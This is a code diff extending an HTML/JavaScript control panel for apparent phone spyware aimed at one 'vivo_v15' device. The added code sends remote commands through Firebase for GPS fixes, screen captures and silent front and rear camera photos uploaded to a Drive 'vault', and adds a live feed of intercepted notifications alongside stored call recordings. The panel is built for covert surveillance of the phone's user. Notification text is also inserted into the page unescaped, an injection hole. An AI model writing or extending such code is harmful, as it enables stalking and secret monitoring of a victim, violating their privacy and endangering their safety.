@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Device Telemetry Console</title>
+  <title>Device Telemetry & Command Center</title>
 
-  <!-- Tailwind CSS -->
+  <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
     tailwind.config = {
@@ -59,7 +59,6 @@
       background-color: #262a37 !important;
       color: #fff !important;
     }
-    /* Dark-mode inverted filter for free OpenStreetMap tiles */
     .leaflet-tile-pane {
       filter: brightness(0.65) invert(1) contrast(2.2) hue-rotate(200deg) saturate(0.25) brightness(0.75);
     }
@@ -103,7 +102,7 @@
           >
         </div>
 
-        <div id="auth-error-banner" class="hidden p-2.5 rounded-lg bg-red-950/40 border border-red-900/60 text-red-400 text-xs"></div>
+        <div id="auth-error-banner" class="hidden p-2.5 rounded-lg bg-red-950/40 border border-red-900/60 text-red-400 text-xs font-mono"></div>
 
         <button 
           type="submit" 
@@ -119,6 +118,7 @@
   <!-- ==================== VIEW 2: OPERATIONAL DASHBOARD ==================== -->
   <div id="view-dashboard" class="flex-1 flex flex-col min-h-screen" style="display: none;">
     
+    <!-- Top Header -->
     <header class="border-b border-surface-border bg-surface px-6 py-3.5 flex items-center justify-between">
       <div class="flex items-center gap-4">
         <span class="text-sm font-semibold tracking-tight text-white flex items-center gap-2">
@@ -131,7 +131,7 @@
       </div>
 
       <div class="flex items-center gap-4 text-xs">
-        <span id="session-user-badge" class="text-surface-muted hidden sm:inline"></span>
+        <span id="session-user-badge" class="text-surface-muted hidden sm:inline font-mono"></span>
         <button 
           id="btn-logout" 
           class="px-2.5 py-1.5 rounded-md border border-surface-border text-slate-400 hover:text-white hover:bg-surface-elevated transition"
@@ -141,6 +141,7 @@
       </div>
     </header>
 
+    <!-- Navigation Tabs -->
     <div class="border-b border-surface-border px-6 flex gap-6 bg-[#101217]">
       <button 
         id="tab-btn-live" 
@@ -148,6 +149,20 @@
         class="py-3 text-xs font-medium border-b-2 border-white text-white transition flex items-center gap-2"
       >
         Live Telemetry & Geolocation
+      </button>
+      <button 
+        id="tab-btn-commands" 
+        onclick="setActiveTab('commands')" 
+        class="py-3 text-xs font-medium border-b-2 border-transparent text-surface-muted hover:text-slate-300 transition flex items-center gap-2"
+      >
+        Remote Command Hub
+      </button>
+      <button 
+        id="tab-btn-notifications" 
+        onclick="setActiveTab('notifications')" 
+        class="py-3 text-xs font-medium border-b-2 border-transparent text-surface-muted hover:text-slate-300 transition flex items-center gap-2"
+      >
+        Notification Interceptor
       </button>
       <button 
         id="tab-btn-drive" 
@@ -158,9 +173,10 @@
       </button>
     </div>
 
+    <!-- Main Content Workspaces -->
     <main class="flex-1 p-6 max-w-7xl w-full mx-auto space-y-6">
 
-      <!-- SECTION 1: LIVE FEED -->
+      <!-- ================= TAB 1: LIVE FEED & MAP ================= -->
       <section id="content-tab-live" class="space-y-6">
         <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
           <div class="p-4 rounded-xl bg-surface border border-surface-border">
@@ -221,7 +237,124 @@
         </div>
       </section>
 
-      <!-- SECTION 2: GOOGLE DRIVE -->
+      <!-- ================= TAB 2: REMOTE COMMAND HUB ================= -->
+      <section id="content-tab-commands" class="hidden space-y-6">
+        <div class="p-5 rounded-xl bg-surface border border-surface-border">
+          <h2 class="text-sm font-semibold text-white">Active Node Dispatch</h2>
+          <p class="text-xs text-surface-muted mt-0.5">Commands execute via the persistent Firebase WebSocket queue on the device.</p>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+          
+          <!-- Command: Location -->
+          <div class="p-5 rounded-xl bg-surface border border-surface-border flex flex-col justify-between space-y-4">
+            <div>
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-xs font-semibold text-white">Acquire GPS Position</span>
+                <span class="text-[10px] font-mono text-cyan-400 bg-cyan-950/40 px-2 py-0.5 rounded border border-cyan-800/40">#CMD_LOC</span>
+              </div>
+              <p class="text-xs text-surface-muted">Requests immediate high-accuracy fix from FusedLocationProviderClient.</p>
+            </div>
+            <button onclick="dispatchRemoteCommand('LOC')" class="w-full py-2 bg-slate-100 hover:bg-white text-slate-900 text-xs font-medium rounded-lg transition">
+              Dispatch Location Fix
+            </button>
+          </div>
+
+          <!-- Command: Screen Capture -->
+          <div class="p-5 rounded-xl bg-surface border border-surface-border flex flex-col justify-between space-y-4">
+            <div>
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-xs font-semibold text-white">Capture Current Screen</span>
+                <span class="text-[10px] font-mono text-amber-400 bg-amber-950/40 px-2 py-0.5 rounded border border-amber-800/40">#CMD_SCREEN</span>
+              </div>
+              <p class="text-xs text-surface-muted">Triggers MediaProjection frame buffer capture and uploads to Drive vault.</p>
+            </div>
+            <button onclick="dispatchRemoteCommand('SCREEN')" class="w-full py-2 bg-slate-100 hover:bg-white text-slate-900 text-xs font-medium rounded-lg transition">
+              Dispatch Screen Grab
+            </button>
+          </div>
+
+          <!-- Command: Front Camera Photo -->
+          <div class="p-5 rounded-xl bg-surface border border-surface-border flex flex-col justify-between space-y-4">
+            <div>
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-xs font-semibold text-white">Front Camera Capture</span>
+                <span class="text-[10px] font-mono text-emerald-400 bg-emerald-950/40 px-2 py-0.5 rounded border border-emerald-800/40">#CMD_PHOTO_FRONT</span>
+              </div>
+              <p class="text-xs text-surface-muted">Snaps a silent image using the front sensor and routes file to Google Drive.</p>
+            </div>
+            <button onclick="dispatchRemoteCommand('PHOTO_FRONT')" class="w-full py-2 bg-slate-100 hover:bg-white text-slate-900 text-xs font-medium rounded-lg transition">
+              Capture Front Frame
+            </button>
+          </div>
+
+          <!-- Command: Rear Camera Photo -->
+          <div class="p-5 rounded-xl bg-surface border border-surface-border flex flex-col justify-between space-y-4">
+            <div>
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-xs font-semibold text-white">Rear Camera Capture</span>
+                <span class="text-[10px] font-mono text-emerald-400 bg-emerald-950/40 px-2 py-0.5 rounded border border-emerald-800/40">#CMD_PHOTO_REAR</span>
+              </div>
+              <p class="text-xs text-surface-muted">Snaps a silent image using the primary rear lens and uploads to Drive vault.</p>
+            </div>
+            <button onclick="dispatchRemoteCommand('PHOTO_REAR')" class="w-full py-2 bg-slate-100 hover:bg-white text-slate-900 text-xs font-medium rounded-lg transition">
+              Capture Rear Frame
+            </button>
+          </div>
+
+          <!-- Command: Keep-Alive Ping -->
+          <div class="p-5 rounded-xl bg-surface border border-surface-border flex flex-col justify-between space-y-4">
+            <div>
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-xs font-semibold text-white">Client Heartbeat Ping</span>
+                <span class="text-[10px] font-mono text-purple-400 bg-purple-950/40 px-2 py-0.5 rounded border border-purple-800/40">#CMD_PING</span>
+              </div>
+              <p class="text-xs text-surface-muted">Verifies socket responsiveness and returns updated battery and hardware stats.</p>
+            </div>
+            <button onclick="dispatchRemoteCommand('PING')" class="w-full py-2 bg-surface-elevated hover:bg-surface-border text-slate-300 text-xs font-medium rounded-lg border border-surface-border transition">
+              Transmit Ping Signal
+            </button>
+          </div>
+
+        </div>
+
+        <div id="command-alert-box" class="hidden p-3 rounded-lg border text-xs font-mono"></div>
+      </section>
+
+      <!-- ================= TAB 3: NOTIFICATION INTERCEPTOR ================= -->
+      <section id="content-tab-notifications" class="hidden space-y-6">
+        <div class="p-5 rounded-xl bg-surface border border-surface-border flex items-center justify-between">
+          <div>
+            <h2 class="text-sm font-semibold text-white">Inbound Device Notification Feed</h2>
+            <p class="text-xs text-surface-muted mt-0.5">Streamed in real-time by the client NotificationListenerService.</p>
+          </div>
+          <button onclick="clearNotificationLogs()" class="px-3 py-1.5 rounded-lg border border-surface-border text-slate-400 hover:text-white text-xs transition">
+            Clear Local Feed
+          </button>
+        </div>
+
+        <div class="rounded-xl bg-surface border border-surface-border overflow-hidden">
+          <div class="overflow-x-auto">
+            <table class="w-full text-left text-xs">
+              <thead class="bg-[#101217] text-surface-muted font-medium border-b border-surface-border">
+                <tr>
+                  <th class="px-4 py-3">Timestamp</th>
+                  <th class="px-4 py-3">Application Source</th>
+                  <th class="px-4 py-3">Sender / Title</th>
+                  <th class="px-4 py-3">Message Body</th>
+                </tr>
+              </thead>
+              <tbody id="notifications-table-body" class="divide-y divide-surface-border font-mono text-[11px]">
+                <tr>
+                  <td colspan="4" class="px-4 py-8 text-center text-surface-muted">Awaiting incoming notifications...</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- ================= TAB 4: GOOGLE DRIVE VAULT ================= -->
       <section id="content-tab-drive" class="hidden space-y-6">
         <div class="p-5 rounded-xl bg-surface border border-surface-border flex flex-col sm:flex-row sm:items-center justify-between gap-4">
           <div>
@@ -231,7 +364,7 @@
                 Folder: VivoV15_Vault
               </span>
             </div>
-            <p class="text-xs text-surface-muted mt-0.5">Filtered strictly to photos and call recordings in this directory.</p>
+            <p class="text-xs text-surface-muted mt-0.5">Displaying photos, recordings, and screenshots filtered strictly to this directory.</p>
           </div>
           <div class="flex items-center gap-3">
             <button 
@@ -285,25 +418,18 @@
     let driveTokenClient = null;
     let driveAccessToken = null;
     let totalLogsCount = 0;
+    let totalNotificationsCount = 0;
     let latestCoordsCache = null;
 
-    // View Switching Logic (Direct style manipulation prevents CSS collisions)
+    // View Lifecycle Management
     function showDashboardView(email) {
       document.getElementById('view-auth').style.display = 'none';
       document.getElementById('view-dashboard').style.display = 'flex';
       document.getElementById('session-user-badge').textContent = email || '';
 
-      try {
-        setupLeafletMap();
-      } catch (err) {
-        console.error('Map init warning:', err);
-      }
-
-      try {
-        listenToFirebaseTelemetry();
-      } catch (err) {
-        console.error('Telemetry init warning:', err);
-      }
+      try { setupLeafletMap(); } catch (err) { console.error('Map init error:', err); }
+      try { listenToFirebaseTelemetry(); } catch (err) { console.error('Telemetry init error:', err); }
+      try { listenToNotificationStream(); } catch (err) { console.error('Notification init error:', err); }
     }
 
     function showAuthView() {
@@ -317,15 +443,13 @@
       }
 
       if (mapInstance) {
-        try {
-          mapInstance.remove();
-        } catch (_) {}
+        try { mapInstance.remove(); } catch (_) {}
         mapInstance = null;
         mapMarker = null;
       }
     }
 
-    // Login Form Event Listener
+    // Login Form Handler
     const formLogin = document.getElementById('form-login');
     const authErrorBanner = document.getElementById('auth-error-banner');
     const btnLoginSubmit = document.getElementById('btn-login-submit');
@@ -344,7 +468,7 @@
         const userCred = await auth.signInWithEmailAndPassword(email, pass);
         showDashboardView(userCred.user.email);
       } catch (err) {
-        console.error('Authentication rejected:', err);
+        console.error('Authentication error:', err);
         authErrorBanner.textContent = err.message || 'Authentication failed.';
         authErrorBanner.classList.remove('hidden');
         btnLoginSubmit.disabled = false;
@@ -364,10 +488,9 @@
       }
     });
 
-    // Map Initialization
+    // Map Setup
     function setupLeafletMap() {
-      if (typeof L === 'undefined') return;
-      if (mapInstance) return;
+      if (typeof L === 'undefined' || mapInstance) return;
 
       mapInstance = L.map('map', {
         zoomControl: true,
@@ -383,7 +506,7 @@
       }, 200);
     }
 
-    // Telemetry Realtime Listener
+    // Real-Time Telemetry Listener
     function listenToFirebaseTelemetry() {
       const nodeRef = db.ref('devices/vivo_v15/latest');
 
@@ -444,6 +567,62 @@
       container.prepend(row);
     }
 
+    // Remote Command Dispatcher
+    async function dispatchRemoteCommand(commandType) {
+      const alertBox = document.getElementById('command-alert-box');
+      alertBox.className = "p-3 rounded-lg border text-xs font-mono bg-blue-950/40 border-blue-900 text-blue-400";
+      alertBox.textContent = `Dispatching #${commandType} to node command queue...`;
+      alertBox.classList.remove('hidden');
+
+      try {
+        const commandRef = db.ref('devices/vivo_v15/commands/pending');
+        await commandRef.set({
+          action: commandType,
+          timestamp: Date.now(),
+          status: "QUEUED"
+        });
+
+        alertBox.className = "p-3 rounded-lg border text-xs font-mono bg-emerald-950/40 border-emerald-900 text-emerald-400";
+        alertBox.textContent = `Packet #${commandType} committed to WebSocket queue successfully.`;
+        setTimeout(() => alertBox.classList.add('hidden'), 4000);
+      } catch (err) {
+        alertBox.className = "p-3 rounded-lg border text-xs font-mono bg-red-950/40 border-red-900 text-red-400";
+        alertBox.textContent = `Dispatch failed: ${err.message}`;
+      }
+    }
+
+    // Notification Feed Listener
+    function listenToNotificationStream() {
+      const notifRef = db.ref('devices/vivo_v15/notifications').limitToLast(40);
+      const tableBody = document.getElementById('notifications-table-body');
+
+      notifRef.on('child_added', (snapshot) => {
+        const item = snapshot.val();
+        if (!item) return;
+
+        if (totalNotificationsCount === 0) tableBody.innerHTML = '';
+        totalNotificationsCount++;
+
+        const timeStr = item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
+        const tr = document.createElement('tr');
+        tr.className = "hover:bg-surface-elevated transition";
+        tr.innerHTML = `
+          <td class="px-4 py-2.5 text-surface-muted whitespace-nowrap">${timeStr}</td>
+          <td class="px-4 py-2.5 text-cyan-400 font-medium whitespace-nowrap">${item.package_name || 'System'}</td>
+          <td class="px-4 py-2.5 text-white font-medium">${item.title || '(No Title)'}</td>
+          <td class="px-4 py-2.5 text-slate-300 truncate max-w-xs">${item.text || '(Empty)'}</td>
+        `;
+        tableBody.prepend(tr);
+      });
+    }
+
+    function clearNotificationLogs() {
+      document.getElementById('notifications-table-body').innerHTML = `
+        <tr><td colspan="4" class="px-4 py-8 text-center text-surface-muted">Local table cleared. Awaiting new items...</td></tr>
+      `;
+      totalNotificationsCount = 0;
+    }
+
     function copyCoordsToClipboard() {
       if (!latestCoordsCache) return;
       navigator.clipboard.writeText(latestCoordsCache);
@@ -452,28 +631,27 @@
       setTimeout(() => { btn.textContent = 'Copy Coords'; }, 1500);
     }
 
-    // Tabs Switching
+    // Tab Navigation
     function setActiveTab(tab) {
-      const btnLive = document.getElementById('tab-btn-live');
-      const btnDrive = document.getElementById('tab-btn-drive');
-      const contentLive = document.getElementById('content-tab-live');
-      const contentDrive = document.getElementById('content-tab-drive');
+      const tabs = ['live', 'commands', 'notifications', 'drive'];
+      tabs.forEach(t => {
+        const btn = document.getElementById(`tab-btn-${t}`);
+        const content = document.getElementById(`content-tab-${t}`);
+        if (t === tab) {
+          btn.className = "py-3 text-xs font-medium border-b-2 border-white text-white transition flex items-center gap-2";
+          content.classList.remove('hidden');
+        } else {
+          btn.className = "py-3 text-xs font-medium border-b-2 border-transparent text-surface-muted hover:text-slate-300 transition flex items-center gap-2";
+          content.classList.add('hidden');
+        }
+      });
 
-      if (tab === 'live') {
-        btnLive.className = "py-3 text-xs font-medium border-b-2 border-white text-white transition flex items-center gap-2";
-        btnDrive.className = "py-3 text-xs font-medium border-b-2 border-transparent text-surface-muted hover:text-slate-300 transition flex items-center gap-2";
-        contentLive.classList.remove('hidden');
-        contentDrive.classList.add('hidden');
-        if (mapInstance) mapInstance.invalidateSize();
-      } else {
-        btnDrive.className = "py-3 text-xs font-medium border-b-2 border-white text-white transition flex items-center gap-2";
-        btnLive.className = "py-3 text-xs font-medium border-b-2 border-transparent text-surface-muted hover:text-slate-300 transition flex items-center gap-2";
-        contentDrive.classList.remove('hidden');
-        contentLive.classList.add('hidden');
+      if (tab === 'live' && mapInstance) {
+        mapInstance.invalidateSize();
       }
     }
 
-    // Google Drive Client Setup
+    // Targeted Drive Media Vault
     window.addEventListener('load', () => {
       driveTokenClient = google.accounts.oauth2.initTokenClient({
         client_id: GOOGLE_CLIENT_ID,
